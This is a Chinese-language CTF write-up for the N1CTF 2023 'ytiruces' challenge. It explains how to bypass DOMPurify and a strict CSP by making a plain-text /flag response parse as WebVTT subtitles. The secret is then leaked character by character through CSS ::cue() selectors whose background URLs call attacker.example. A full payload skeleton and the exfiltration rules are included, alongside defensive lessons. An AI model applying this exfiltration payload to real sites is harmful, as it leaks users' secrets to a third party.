# N1CTF 2023 ytiruces

## 题目简述

页面把查询参数 `content` 经 DOMPurify 清洗后写入 `innerHTML`。CSP 禁止外部脚本，却允许内联样式；管理员 bot 会携带包含 flag 的 Cookie 访问指定页面。另有 `/flag?name=` 接口，将最长 32 字节的 ASCII `name` 与 flag 拼接后以 `text/plain` 返回。

直接 XSS 行不通，解题关键是把 `/flag` 响应作为 WebVTT 字幕加载，再使用 CSS `::cue()` 属性选择器逐字符判断字幕中的秘密值。

## 解题过程

### 构造可解析的 WebVTT 响应

`<track>` 元素会按 WebVTT 解析其 `src` 响应。虽然 `/flag` 声明为 `text/plain`，但可以在 `name` 参数中注入回车和 WebVTT 时间轴，使拼接后的响应成为有效字幕。载荷骨架如下：

```html
<video muted autoplay controls src="//attacker.example/s.mp3">
  <track default
    src="/flag?name=WEBVTT%0d00:00.000-->00:30.000%0d<v">
  <style>
    ::cue(v[voice^="n1ctf{a"]){
      background:url(//attacker.example/leak?n1ctf%7Ba)
    }
  </style>
</video>
```

`name` 产生 WebVTT 头、一个持续 30 秒的 cue，以及尚未闭合的 `<v` voice 标签；紧随其后的 flag 会进入该标签的 voice 属性。`video` 的媒体源保证字幕轨道实际进入活动状态。

### 用 CSS 前缀选择器逐字符泄露

CSS 字幕伪元素支持对 voice 标签做属性匹配：

```css
::cue(v[voice^="已知前缀a"]){background:url(//attacker/?a)}
::cue(v[voice^="已知前缀b"]){background:url(//attacker/?b)}
```

如果某个候选前缀与真实 flag 相符，浏览器会为该规则加载攻击者服务器上的背景图片。服务器日志中的请求参数便指出了下一字符。把已知前缀追加该字符，重新生成规则并让 bot 再访问，循环到 `}` 即可。

`name` 最长 32 字节，因此 WebVTT 头必须采用上面这种紧凑写法。字母大小写和 `}` 组成的候选池则可拆成六组、每组约 9 个字符，分别生成六条以 `https://ytiruces.ctfpunk.com/` 开头的 URL 交给 bot，使每条 URL 中的 CSS 规模保持可控。页面的 DOMPurify 会删除脚本，但会保留嵌套在 `video` 中、本题所需的 `track` 和 `style`，CSP 中的 `'unsafe-inline'` 也允许这些 CSS 规则生效。

本地仓库只留下简短 PoC 指向；更完整的公开复现可参考 [CSS Injection on N1CTF 2023 ytiruces](https://blog.hspace.io/posts/CSS_injection/)。上面的正文已经包含该文章对 WebVTT 构造、`::cue()` 匹配和分组爆破的关键机制，不依赖外链也能复现。

## 方法总结

这道题利用的是浏览器的内容解释差异：普通文本接口的响应被 `<track>` 当成 WebVTT，秘密又被注入到可由 CSS 选择的 voice 属性中。DOMPurify 和 CSP 阻止了脚本执行，却没有阻止 CSS 触发网络请求。面对 CSS injection，应系统检查字体、背景、表单状态和字幕伪元素等可观察副作用，并同时验证目标响应能否被某个 HTML 子资源解析器重新解释。
